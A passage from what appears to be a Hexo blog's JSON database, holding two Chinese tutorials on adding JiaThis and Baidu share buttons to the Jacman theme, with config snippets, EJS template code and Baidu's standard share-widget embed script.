三、分享效果展示\n分享按钮样式：\n![jiathis分享](http://7xkl4i.com1.z0.glb.clouddn.com/hexo-jacman-jiathis-share.png)\n\n内容分享给QQ好友：\n![分享给QQ好友](http://7xkl4i.com1.z0.glb.clouddn.com/hexo-jacman-jiathis-share-qq.png)\n\n内容分享到微博：\n![分享到微博](http://7xkl4i.com1.z0.glb.clouddn.com/hexo-jacman-jiathis-share-weibo.png)\n\n\n## 四、小结\n\n### 1. 分享内容丰富\njiathis分享最大的一个优点在于主流的社交平台分享的内容更加丰富：描述会带上一部分正方内容，另外会附带上正文中的图片。\n\n### 2. 累计分享次数统计\n较多说分享而言，jiathis多出一个累计分享次数统计功能。\n较百度分享而言，找了好久才在别人的博客里找到百度分享累计分享次数的代码，未在百度分享网站显目位置有说明介绍。\n","source":"_posts/article/hexo/jacman主题开启jiathis分享.md","raw":"title: jacman主题开启jiathis分享\ntags:\n  - hexo\n  - 分享代码\ncategories:\n  - 博客搭建\ndate: 2016-02-16 15:45:00\n---\n\n<img src=\"/asserts/images/logo/hexo.png\" title=\"hexo\" class=\"img-logo img-center\" />\n\n\n## 一、前言\n本文内容基于wuchong的Jacman主题。\n\n### 1. 默认分享样式\n默认分享样式如下图所示：\n![默认分享](http://7xkl4i.com1.z0.glb.clouddn.com/hexo-jacman-default-share.png)\n\n### 2. 代码位置\n分享按钮位置：themes/jacman/layout/_partial/post/footer.ejs\n代码块：\n``` html\n<div class=\"article-share\" id=\"share\">\n</div>\n```\n\n\n## 二、开启jiathis分享\njacman主题默认支持jiathis分享，只需要如下简单几步工作即可开启：\n\n### 1. 注册jiathis\n登录[jiathis网站](http://www.jiathis.com/)，完成注册。\n进入账号设置，在基本资料栏可以获取用户ID：2084038。\n\n### 2. 主题配置\n修改主题配置文件themes/jacman/_config.yml，如下：\n\n``` txt\n#### Share button\njiathis:\n  enable: true ## if you use jiathis as your share tool,the built-in share tool won't be display.\n  id: 2084038   ## e.g. 1889330 your jiathis ID.\n  tsina: 1873363984 ## e.g. 2176287895 Your weibo id,It will be used in share button.\n```\n\n**注**：enable, id, tsina前有二个空格(表示层级关系)，在代码里，可能通过theme.jiathis.enable获取其值。\n\n### 3. 代码逻辑\n代码：themes/jacman/layout/_partial/post/footer.ejs\n\njiathis分享相关代码逻辑：\n``` html\n<% if(theme.jiathis.enable){ %>\n<div class=\"share-jiathis\">\n  <%- partial('jiathis') %>\n </div>\n<% } else { %>\n  <div data-url=\"<%- item.permalink %>\" data-title=\"<% if (item.title){ %><%= item.title %> | <% } %><%= config.title %>\" data-tsina=\"<%= theme.author.tsina %>\" class=\"share clearfix\">\n  </div>\n<% } %>\n```\n\n**注**：`<%- partial('jiathis') %>`语法表示加载当前目录下的jiathis.ejs文件。\n\n### 4. 调整分享按钮顺序\n代码：themes/jacman/layout/_partial/post/jiathis.ejs\n\n调整后的顺序：\n``` html\n<div class=\"jiathis_style_24x24\">\n    <a class=\"jiathis_button_cqq\"></a>\n    <a class=\"jiathis_button_qzone\"></a>\n    <a class=\"jiathis_button_weixin\"></a>\n    <a class=\"jiathis_button_tsina\"></a>\n    <a class=\"jiathis_button_renren\"></a>\n    <a href=\"http://www.jiathis.com/share\" class=\"jiathis jiathis_txt jtico jtico_jiathis\" target=\"_blank\"></a>\n    <a class=\"jiathis_counter_style\"></a>\n</div>\n```\n\n\n## 三、分享效果展示\n分享按钮样式：\n![jiathis分享](http://7xkl4i.com1.z0.glb.clouddn.com/hexo-jacman-jiathis-share.png)\n\n内容分享给QQ好友：\n![分享给QQ好友](http://7xkl4i.com1.z0.glb.clouddn.com/hexo-jacman-jiathis-share-qq.png)\n\n内容分享到微博：\n![分享到微博](http://7xkl4i.com1.z0.glb.clouddn.com/hexo-jacman-jiathis-share-weibo.png)\n\n\n## 四、小结\n\n### 1. 分享内容丰富\njiathis分享最大的一个优点在于主流的社交平台分享的内容更加丰富：描述会带上一部分正方内容，另外会附带上正文中的图片。\n\n### 2. 累计分享次数统计\n较多说分享而言，jiathis多出一个累计分享次数统计功能。\n较百度分享而言，找了好久才在别人的博客里找到百度分享累计分享次数的代码，未在百度分享网站显目位置有说明介绍。\n","slug":"article/hexo/jacman主题开启jiathis分享","published":1,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxqt001n5nbtuc2atd9h","content":"<p><img src=\"/asserts/images/logo/hexo.png\" title=\"hexo\" class=\"img-logo img-center\"></p>\n<h2 id=\"一、前言\"><a href=\"#一、前言\" class=\"headerlink\" title=\"一、前言\"></a>一、前言</h2><p>本文内容基于wuchong的Jacman主题。</p>\n<h3 id=\"1-默认分享样式\"><a href=\"#1-默认分享样式\" class=\"headerlink\" title=\"1. 默认分享样式\"></a>1. 默认分享样式</h3><p>默认分享样式如下图所示：<br><img src=\"http://7xkl4i.com1.z0.glb.clouddn.com/hexo-jacman-default-share.png\" alt=\"默认分享\"></p>\n<h3 id=\"2-代码位置\"><a href=\"#2-代码位置\" class=\"headerlink\" title=\"2. 代码位置\"></a>2. 代码位置</h3><p>分享按钮位置：themes/jacman/layout/_partial/post/footer.ejs<br>代码块：<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"article-share\"</span> <span class=\"attr\">id</span>=<span class=\"string\">\"share\"</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<h2 id=\"二、开启jiathis分享\"><a href=\"#二、开启jiathis分享\" class=\"headerlink\" title=\"二、开启jiathis分享\"></a>二、开启jiathis分享</h2><p>jacman主题默认支持jiathis分享，只需要如下简单几步工作即可开启：</p>\n<h3 id=\"1-注册jiathis\"><a href=\"#1-注册jiathis\" class=\"headerlink\" title=\"1. 注册jiathis\"></a>1. 注册jiathis</h3><p>登录<a href=\"http://www.jiathis.com/\" target=\"_blank\" rel=\"external\">jiathis网站</a>，完成注册。<br>进入账号设置，在基本资料栏可以获取用户ID：2084038。</p>\n<h3 id=\"2-主题配置\"><a href=\"#2-主题配置\" class=\"headerlink\" title=\"2. 主题配置\"></a>2. 主题配置</h3><p>修改主题配置文件themes/jacman/_config.yml，如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">#### Share button</div><div class=\"line\">jiathis:</div><div class=\"line\">  enable: true ## if you use jiathis as your share tool,the built-in share tool won&apos;t be display.</div><div class=\"line\">  id: 2084038   ## e.g. 1889330 your jiathis ID.</div><div class=\"line\">  tsina: 1873363984 ## e.g. 2176287895 Your weibo id,It will be used in share button.</div></pre></td></tr></table></figure>\n<p><strong>注</strong>：enable, id, tsina前有二个空格(表示层级关系)，在代码里，可能通过theme.jiathis.enable获取其值。</p>\n<h3 id=\"3-代码逻辑\"><a href=\"#3-代码逻辑\" class=\"headerlink\" title=\"3. 代码逻辑\"></a>3. 代码逻辑</h3><p>代码：themes/jacman/layout/_partial/post/footer.ejs</p>\n<p>jiathis分享相关代码逻辑：<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">%</span> <span class=\"attr\">if</span>(<span class=\"attr\">theme.jiathis.enable</span>)&#123; %&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"share-jiathis\"</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">%-</span> <span class=\"attr\">partial</span>('<span class=\"attr\">jiathis</span>') %&gt;</span></div><div class=\"line\"> <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">%</span> &#125; <span class=\"attr\">else</span> &#123; %&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">data-url</span>=<span class=\"string\">\"&lt;%- item.permalink %&gt;\"</span> <span class=\"attr\">data-title</span>=<span class=\"string\">\"&lt;% if (item.title)&#123; %&gt;&lt;%= item.title %&gt; | &lt;% &#125; %&gt;&lt;%= config.title %&gt;\"</span> <span class=\"attr\">data-tsina</span>=<span class=\"string\">\"&lt;%= theme.author.tsina %&gt;\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"share clearfix\"</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">%</span> &#125; %&gt;</span></div></pre></td></tr></table></figure></p>\n<p><strong>注</strong>：<code>&lt;%- partial(&#39;jiathis&#39;) %&gt;</code>语法表示加载当前目录下的jiathis.ejs文件。</p>\n<h3 id=\"4-调整分享按钮顺序\"><a href=\"#4-调整分享按钮顺序\" class=\"headerlink\" title=\"4. 调整分享按钮顺序\"></a>4. 调整分享按钮顺序</h3><p>代码：themes/jacman/layout/_partial/post/jiathis.ejs</p>\n<p>调整后的顺序：<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"jiathis_style_24x24\"</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">class</span>=<span class=\"string\">\"jiathis_button_cqq\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">class</span>=<span class=\"string\">\"jiathis_button_qzone\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">class</span>=<span class=\"string\">\"jiathis_button_weixin\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">class</span>=<span class=\"string\">\"jiathis_button_tsina\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">class</span>=<span class=\"string\">\"jiathis_button_renren\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"http://www.jiathis.com/share\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"jiathis jiathis_txt jtico jtico_jiathis\"</span> <span class=\"attr\">target</span>=<span class=\"string\">\"_blank\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">class</span>=<span class=\"string\">\"jiathis_counter_style\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<h2 id=\"三、分享效果展示\"><a href=\"#三、分享效果展示\" class=\"headerlink\" title=\"三、分享效果展示\"></a>三、分享效果展示</h2><p>分享按钮样式：<br><img src=\"http://7xkl4i.com1.z0.glb.clouddn.com/hexo-jacman-jiathis-share.png\" alt=\"jiathis分享\"></p>\n<p>内容分享给QQ好友：<br><img src=\"http://7xkl4i.com1.z0.glb.clouddn.com/hexo-jacman-jiathis-share-qq.png\" alt=\"分享给QQ好友\"></p>\n<p>内容分享到微博：<br><img src=\"http://7xkl4i.com1.z0.glb.clouddn.com/hexo-jacman-jiathis-share-weibo.png\" alt=\"分享到微博\"></p>\n<h2 id=\"四、小结\"><a href=\"#四、小结\" class=\"headerlink\" title=\"四、小结\"></a>四、小结</h2><h3 id=\"1-分享内容丰富\"><a href=\"#1-分享内容丰富\" class=\"headerlink\" title=\"1. 分享内容丰富\"></a>1. 分享内容丰富</h3><p>jiathis分享最大的一个优点在于主流的社交平台分享的内容更加丰富：描述会带上一部分正方内容，另外会附带上正文中的图片。</p>\n<h3 id=\"2-累计分享次数统计\"><a href=\"#2-累计分享次数统计\" class=\"headerlink\" title=\"2. 累计分享次数统计\"></a>2. 累计分享次数统计</h3><p>较多说分享而言，jiathis多出一个累计分享次数统计功能。<br>较百度分享而言，找了好久才在别人的博客里找到百度分享累计分享次数的代码，未在百度分享网站显目位置有说明介绍。</p>\n","excerpt":"","more":"<p><img src=\"/asserts/images/logo/hexo.png\" title=\"hexo\" class=\"img-logo img-center\" /></p>\n<h2 id=\"一、前言\"><a href=\"#一、前言\" class=\"headerlink\" title=\"一、前言\"></a>一、前言</h2><p>本文内容基于wuchong的Jacman主题。</p>\n<h3 id=\"1-默认分享样式\"><a href=\"#1-默认分享样式\" class=\"headerlink\" title=\"1. 默认分享样式\"></a>1. 默认分享样式</h3><p>默认分享样式如下图所示：<br><img src=\"http://7xkl4i.com1.z0.glb.clouddn.com/hexo-jacman-default-share.png\" alt=\"默认分享\"></p>\n<h3 id=\"2-代码位置\"><a href=\"#2-代码位置\" class=\"headerlink\" title=\"2. 代码位置\"></a>2. 代码位置</h3><p>分享按钮位置：themes/jacman/layout/_partial/post/footer.ejs<br>代码块：<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"article-share\"</span> <span class=\"attr\">id</span>=<span class=\"string\">\"share\"</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<h2 id=\"二、开启jiathis分享\"><a href=\"#二、开启jiathis分享\" class=\"headerlink\" title=\"二、开启jiathis分享\"></a>二、开启jiathis分享</h2><p>jacman主题默认支持jiathis分享，只需要如下简单几步工作即可开启：</p>\n<h3 id=\"1-注册jiathis\"><a href=\"#1-注册jiathis\" class=\"headerlink\" title=\"1. 注册jiathis\"></a>1. 注册jiathis</h3><p>登录<a href=\"http://www.jiathis.com/\">jiathis网站</a>，完成注册。<br>进入账号设置，在基本资料栏可以获取用户ID：2084038。</p>\n<h3 id=\"2-主题配置\"><a href=\"#2-主题配置\" class=\"headerlink\" title=\"2. 主题配置\"></a>2. 主题配置</h3><p>修改主题配置文件themes/jacman/_config.yml，如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">#### Share button</div><div class=\"line\">jiathis:</div><div class=\"line\">  enable: true ## if you use jiathis as your share tool,the built-in share tool won&apos;t be display.</div><div class=\"line\">  id: 2084038   ## e.g. 1889330 your jiathis ID.</div><div class=\"line\">  tsina: 1873363984 ## e.g. 2176287895 Your weibo id,It will be used in share button.</div></pre></td></tr></table></figure>\n<p><strong>注</strong>：enable, id, tsina前有二个空格(表示层级关系)，在代码里，可能通过theme.jiathis.enable获取其值。</p>\n<h3 id=\"3-代码逻辑\"><a href=\"#3-代码逻辑\" class=\"headerlink\" title=\"3. 代码逻辑\"></a>3. 代码逻辑</h3><p>代码：themes/jacman/layout/_partial/post/footer.ejs</p>\n<p>jiathis分享相关代码逻辑：<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">%</span> <span class=\"attr\">if</span>(<span class=\"attr\">theme.jiathis.enable</span>)&#123; %&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"share-jiathis\"</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">%-</span> <span class=\"attr\">partial</span>('<span class=\"attr\">jiathis</span>') %&gt;</span></div><div class=\"line\"> <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">%</span> &#125; <span class=\"attr\">else</span> &#123; %&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">data-url</span>=<span class=\"string\">\"&lt;%- item.permalink %&gt;\"</span> <span class=\"attr\">data-title</span>=<span class=\"string\">\"&lt;% if (item.title)&#123; %&gt;&lt;%= item.title %&gt; | &lt;% &#125; %&gt;&lt;%= config.title %&gt;\"</span> <span class=\"attr\">data-tsina</span>=<span class=\"string\">\"&lt;%= theme.author.tsina %&gt;\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"share clearfix\"</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">%</span> &#125; %&gt;</span></div></pre></td></tr></table></figure></p>\n<p><strong>注</strong>：<code>&lt;%- partial(&#39;jiathis&#39;) %&gt;</code>语法表示加载当前目录下的jiathis.ejs文件。</p>\n<h3 id=\"4-调整分享按钮顺序\"><a href=\"#4-调整分享按钮顺序\" class=\"headerlink\" title=\"4. 调整分享按钮顺序\"></a>4. 调整分享按钮顺序</h3><p>代码：themes/jacman/layout/_partial/post/jiathis.ejs</p>\n<p>调整后的顺序：<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"jiathis_style_24x24\"</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">class</span>=<span class=\"string\">\"jiathis_button_cqq\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">class</span>=<span class=\"string\">\"jiathis_button_qzone\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">class</span>=<span class=\"string\">\"jiathis_button_weixin\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">class</span>=<span class=\"string\">\"jiathis_button_tsina\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">class</span>=<span class=\"string\">\"jiathis_button_renren\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"http://www.jiathis.com/share\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"jiathis jiathis_txt jtico jtico_jiathis\"</span> <span class=\"attr\">target</span>=<span class=\"string\">\"_blank\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">class</span>=<span class=\"string\">\"jiathis_counter_style\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<h2 id=\"三、分享效果展示\"><a href=\"#三、分享效果展示\" class=\"headerlink\" title=\"三、分享效果展示\"></a>三、分享效果展示</h2><p>分享按钮样式：<br><img src=\"http://7xkl4i.com1.z0.glb.clouddn.com/hexo-jacman-jiathis-share.png\" alt=\"jiathis分享\"></p>\n<p>内容分享给QQ好友：<br><img src=\"http://7xkl4i.com1.z0.glb.clouddn.com/hexo-jacman-jiathis-share-qq.png\" alt=\"分享给QQ好友\"></p>\n<p>内容分享到微博：<br><img src=\"http://7xkl4i.com1.z0.glb.clouddn.com/hexo-jacman-jiathis-share-weibo.png\" alt=\"分享到微博\"></p>\n<h2 id=\"四、小结\"><a href=\"#四、小结\" class=\"headerlink\" title=\"四、小结\"></a>四、小结</h2><h3 id=\"1-分享内容丰富\"><a href=\"#1-分享内容丰富\" class=\"headerlink\" title=\"1. 分享内容丰富\"></a>1. 分享内容丰富</h3><p>jiathis分享最大的一个优点在于主流的社交平台分享的内容更加丰富：描述会带上一部分正方内容，另外会附带上正文中的图片。</p>\n<h3 id=\"2-累计分享次数统计\"><a href=\"#2-累计分享次数统计\" class=\"headerlink\" title=\"2. 累计分享次数统计\"></a>2. 累计分享次数统计</h3><p>较多说分享而言，jiathis多出一个累计分享次数统计功能。<br>较百度分享而言，找了好久才在别人的博客里找到百度分享累计分享次数的代码，未在百度分享网站显目位置有说明介绍。</p>\n"},{"title":"jacman主题集成百度分享","date":"2016-02-16T08:53:00.000Z","_content":"\n<img src=\"/asserts/images/logo/hexo.png\" title=\"hexo\" class=\"img-logo img-center\" />\n\n\n## 一、前言\n本文内容基于wuchong的Jacman主题。\n\n### 1. 默认分享样式\n默认分享样式如下图所示：\n![默认分享](http://7xkl4i.com1.z0.glb.clouddn.com/hexo-jacman-default-share.png)\n\n### 2. 代码位置\n分享按钮位置：themes/jacman/layout/_partial/post/footer.ejs\n代码块：\n``` html\n<div class=\"article-share\" id=\"share\">\n</div>\n```\n\n\n## 二、集成百度分享\njacman主题默认不支持百度分享，只需要如下简单几步工作即可集成：\n\n### 1. 登录或注册百度\n登录[百度分享](http://share.baidu.com/)，完成登录或注册。\n\n### 2. 主题配置\n修改主题配置文件themes/jacman/_config.yml，如下：\n\n``` txt\nbdshare:\n  enable: true ## if you use baidu share as your share tool,the built-in share tool won't be display.\n```\n\n**注**：enable前有二个空格(表示层级关系)，在代码里，可能通过theme.bdshare.enable获取其值。\n\n### 3. 代码逻辑\n代码：themes/jacman/layout/_partial/post/footer.ejs\n\n百度分享相关代码逻辑：\n``` html\n<div class=\"article-share\" id=\"share\">\n    <% if(theme.bdshare.enable){ %>\n      <%- partial('bdshare') %>\n    <% } else { %>\n        <% if(theme.jiathis.enable){ %>\n        <div class=\"share-jiathis\">\n          <%- partial('jiathis') %>\n         </div>\n        <% } else { %>\n          <div data-url=\"<%- item.permalink %>\" data-title=\"<% if (item.title){ %><%= item.title %> | <% } %><%= config.title %>\" data-tsina=\"<%= theme.author.tsina %>\" class=\"share clearfix\">\n          </div>\n        <% } %>\n    <% } %>\n    </div>\n```\n\n在原来theme.jiathis.enable代码块外层包一层theme.bdshare.enable判断，优先判断是否使用百度分享。\n\n**注**：`<%- partial('bdshare') %>`语法表示加载当前目录下的bdshare.ejs文件。\n\n### 4. 百度分享模块\n代码：themes/jacman/layout/_partial/post/bdshare.ejs\n\n新建bdshare.ejs，并复制如下内容：\n``` html\n<% if (theme.bdshare.enable){ %>\n    <div class=\"bdsharebuttonbox\">\n        <a href=\"#\" class=\"bds_more\" data-cmd=\"more\"></a>\n        <a href=\"#\" class=\"bds_sqq\" data-cmd=\"sqq\" title=\"分享到QQ好友\"></a>\n        <a href=\"#\" class=\"bds_qzone\" data-cmd=\"qzone\" title=\"分享到QQ空间\"></a>\n        <a href=\"#\" class=\"bds_weixin\" data-cmd=\"weixin\" title=\"分享到微信\"></a>\n        <a href=\"#\" class=\"bds_tsina\" data-cmd=\"tsina\" title=\"分享到新浪微博\"></a>\n        <a href=\"#\" class=\"bds_renren\" data-cmd=\"renren\" title=\"分享到人人网\"></a>\n        <a href=\"#\" class=\"bds_count\" data-cmd=\"count\"></a>\n    </div>\n    <script>window._bd_share_config={\"common\":{\"bdSnsKey\":{},\"bdText\":\"\",\"bdMini\":\"1\",\"bdMiniList\":false,\"bdPic\":\"\",\"bdStyle\":\"0\",\"bdSize\":\"24\"},\"share\":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>\n<% } %>\n```\n\n### 5. 检测分享代码版本\n``` javascript\n//打开已安装分享代码的页面，在控制台中执行：\njavascript:b=(window.bdShare||window._bd_share_main);alert(b?'\\u5F53\\u524D\\u9875\\u9762\\u7684\\u5206\\u4EAB\\u4EE3\\u7801\\u7248\\u672C\\u4E3A\\uFF1A'+(b.version||'1.0'):'\\u5F53\\u524D\\u9875\\u9762\\u6CA1\\u6709\\u5B89\\u88C5\\u5206\\u4EAB\\u4EE3\\u7801\\u3002')\n```\n\n参见：[检测分享代码版本](http://share.baidu.com/code/advance#tools)\n\n\n## 三、分享效果展示\n分享按钮样式：\n![jiathis分享](http://7xkl4i.com1.z0.glb.clouddn.com/hexo-jacman-bdshare-share.png)\n\n内容分享给QQ好友：\n![分享给QQ好友](http://7xkl4i.com1.z0.glb.clouddn.com/hexo-jacman-bdshare-share-qq.png)\n\n内容分享到微博：\n![分享到微博](http://7xkl4i.com1.z0.glb.clouddn.com/hexo-jacman-bdshare-share-weibo.png)\n\n\n## 四、小结\n百度分享最大的一个优点在于更能提高在百度的搜索排名。另外，个人感觉百度分享生成代码过程更加友好。\n内容分享描述比较简单，仅仅只支持标题是硬伤。\n","source":"_posts/article/hexo/jacman主题集成百度分享.md","raw":"title: jacman主题集成百度分享\ntags:\n  - hexo\n  - 分享代码\ncategories:\n  - 博客搭建\ndate: 2016-02-16 16:53:00\n---\n\n<img src=\"/asserts/images/logo/hexo.png\" title=\"hexo\" class=\"img-logo img-center\" />\n\n\n## 一、前言\n本文内容基于wuchong的Jacman主题。\n\n### 1. 默认分享样式\n默认分享样式如下图所示：\n![默认分享](http://7xkl4i.com1.z0.glb.clouddn.com/hexo-jacman-default-share.png)\n\n### 2. 代码位置\n分享按钮位置：themes/jacman/layout/_partial/post/footer.ejs\n代码块：\n``` html\n<div class=\"article-share\" id=\"share\">\n</div>\n```\n\n\n## 二、集成百度分享\njacman主题默认不支持百度分享，只需要如下简单几步工作即可集成：\n\n### 1. 登录或注册百度\n登录[百度分享](http://share.baidu.com/)，完成登录或注册。\n\n### 2. 主题配置\n修改主题配置文件themes/jacman/_config.yml，如下：\n\n``` txt\nbdshare:\n  enable: true ## if you use baidu share as your share tool,the built-in share tool won't be display.\n```\n\n**注**：enable前有二个空格(表示层级关系)，在代码里，可能通过theme.bdshare.enable获取其值。\n\n### 3. 代码逻辑\n代码：themes/jacman/layout/_partial/post/footer.ejs\n\n百度分享相关代码逻辑：\n``` html\n<div class=\"article-share\" id=\"share\">\n    <% if(theme.bdshare.enable){ %>\n      <%- partial('bdshare') %>\n    <% } else { %>\n        <% if(theme.jiathis.enable){ %>\n        <div class=\"share-jiathis\">\n          <%- partial('jiathis') %>\n         </div>\n        <% } else { %>\n          <div data-url=\"<%- item.permalink %>\" data-title=\"<% if (item.title){ %><%= item.title %> | <% } %><%= config.title %>\" data-tsina=\"<%= theme.author.tsina %>\" class=\"share clearfix\">\n          </div>\n        <% } %>\n    <% } %>\n    </div>\n```\n\n在原来theme.jiathis.enable代码块外层包一层theme.bdshare.enable判断，优先判断是否使用百度分享。\n\n**注**：`<%- partial('bdshare') %>`语法表示加载当前目录下的bdshare.ejs文件。\n\n### 4. 百度分享模块\n代码：themes/jacman/layout/_partial/post/bdshare.ejs\n\n新建bdshare.ejs，并复制如下内容：\n``` html\n<% if (theme.bdshare.enable){ %>\n    <div class=\"bdsharebuttonbox\">\n        <a href=\"#\" class=\"bds_more\" data-cmd=\"more\"></a>\n        <a href=\"#\" class=\"bds_sqq\" data-cmd=\"sqq\" title=\"分享到QQ好友\"></a>\n        <a href=\"#\" class=\"bds_qzone\" data-cmd=\"qzone\" title=\"分享到QQ空间\"></a>\n        <a href=\"#\" class=\"bds_weixin\" data-cmd=\"weixin\" title=\"分享到微信\"></a>\n        <a href=\"#\" class=\"bds_tsina\" data-cmd=\"tsina\" title=\"分享到新浪微博\"></a>\n        <a href=\"#\" class=\"bds_renren\" data-cmd=\"renren\" title=\"分享到人人网\"></a>\n        <a href=\"#\" class=\"bds_count\" data-cmd=\"count\"></a>\n    </div>\n    